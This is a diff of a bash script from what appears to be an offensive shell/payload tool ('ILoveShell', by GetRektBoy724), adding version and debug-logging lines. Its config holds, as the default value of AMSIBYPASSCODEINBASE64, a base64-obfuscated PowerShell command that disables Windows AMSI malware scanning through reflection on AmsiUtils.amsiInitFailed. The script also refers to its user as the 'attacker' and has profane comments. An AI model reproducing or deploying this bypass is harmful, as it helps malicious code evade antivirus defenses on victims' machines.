@@ -4,19 +4,27 @@
 okegreen='\033[92m' #goddamn it please dont fucking change it
 red='\e[1;31m' #goddamn it please dont fucking change it
 BlueF='\e[1;34m' #goddamn it please dont fucking change it
-COWSAYFILE=/usr/bin/cowsay #you can change this as you want
+COWSAYFILE=/usr/bin/cowsay #goddamn it please dont fucking change it
 COWSAYFILESOURCE=/usr/games/cowsay #you can change this as you want
 AMSIBYPASSCODEINBASE64="WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwAgACsAIAAnAFUAdABpAGwAcwAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkAJwAgACsAIAAnAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA=" #this is the default one....please dont change
 ATTACKERARCH=`dpkg --print-architecture` #goddamn it please dont fucking change it
 DETECTINTERNETCONNECTION=yes #not recommended to change it but you can change it to "no"
 DETECTATTACKERLINUXDISTRIBUTION=yes #not recommended to change it but you can change it to "no" 
 ENABLEROOTDETECTOR=yes #not recommended to change it but you can change it to "no"
-SESSIONID=$RANDOM
+SESSIONID=$RANDOM #goddamn it please dont fucking change it
+VERSION=v3.1.0 #goddamn it please dont fucking change it
 #------------colors and configs----------
 #deleting old debug.log
 rm debug.log &> /dev/null
 #installing prequisite
 touch debug.log &> /dev/null
+echo "#ProgramConfigs" &>> debug.log
+echo "COWSAYFILESOURCE = $COWSAYFILESOURCE" &>> debug.log
+echo "AMSIBYPASSCODEINBASE64 (default) = $AMSIBYPASSCODEINBASE64" &>> debug.log
+echo "ATTACKERARCH = $ATTACKERARCH" &>> debug.log
+echo "DETECTINTERNETCONNECTION = $DETECTINTERNETCONNECTION" &>> debug.log
+echo "DETECTATTACKERLINUXDISTRIBUTION = $DETECTATTACKERLINUXDISTRIBUTION" &>> debug.log
+echo "ENABLEROOTDETECTOR = $ENABLEROOTDETECTOR" &>> debug.log
 #[-------------------------BEGIN debug.log ZONE-------------------------]
 #session id 
 echo "#SESSION ID NUMBER : $SESSIONID" &>> debug.log
@@ -257,7 +265,7 @@ bannerrandomizer
 showbanner
 echo -e $okegreen "                [---] Tool Programmed By GetRektBoy724 [---]                 "
 echo -e $okegreen "                [---]      Codename : ILoveShell       [---]                 "
-echo -e $okegreen "                [---]        Version : v3.0.0          [---]                 "
+echo -e $okegreen "                [---]        Version : $VERSION          [---]                 "
 echo -e $okegreen "         [---] Follow Me At : https://github.com/GetRektBoy724 [---]         "
 echo -e $okegreen "                    [---] Session ID Number : $SESSIONID [---]                  "
 echo -e $okegreen " [-----------------------------------------------------------] "
